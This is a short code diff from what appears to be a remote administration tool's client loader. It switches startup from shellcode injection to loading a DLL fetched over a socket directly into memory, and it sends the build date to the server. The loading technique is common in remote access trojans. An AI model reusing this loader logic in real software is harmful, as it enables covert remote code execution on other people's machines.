@@ -39,7 +39,7 @@ BOOL status = 0;
 
 HANDLE hEvent = NULL;
 
-CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION, 0, Startup_InjSC };
+CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_DLL, false, DLL_VERSION, 0, Startup_MEMDLL };
 
 BOOL CALLBACK callback(DWORD CtrlType)
 {
@@ -141,12 +141,13 @@ public:
                 continue;
             }
 #ifdef _DEBUG
-            char command[4] = { SOCKET_DLLLOADER, sizeof(void*) == 8, MEMORYDLL, 0 };
+            char command[16] = { SOCKET_DLLLOADER, sizeof(void*) == 8, MEMORYDLL, 0 };
 #else
-            char command[4] = { SOCKET_DLLLOADER, sizeof(void*) == 8, MEMORYDLL, 1 };
+            char command[16] = { SOCKET_DLLLOADER, sizeof(void*) == 8, MEMORYDLL, 1 };
 #endif
-            char req[sizeof(PkgHeader) + 4] = {};
-            memcpy(req, &PkgHeader(4), sizeof(PkgHeader));
+            memcpy(command + 4, __DATE__, 11);  // 发送版本日期用于大 DLL 检查
+            char req[sizeof(PkgHeader) + sizeof(command)] = {};
+            memcpy(req, &PkgHeader(sizeof(command)), sizeof(PkgHeader));
             memcpy(req + sizeof(PkgHeader), command, sizeof(command));
             auto bytesSent = send(clientSocket, req, sizeof(req), 0);
             if (bytesSent != sizeof(req)) {
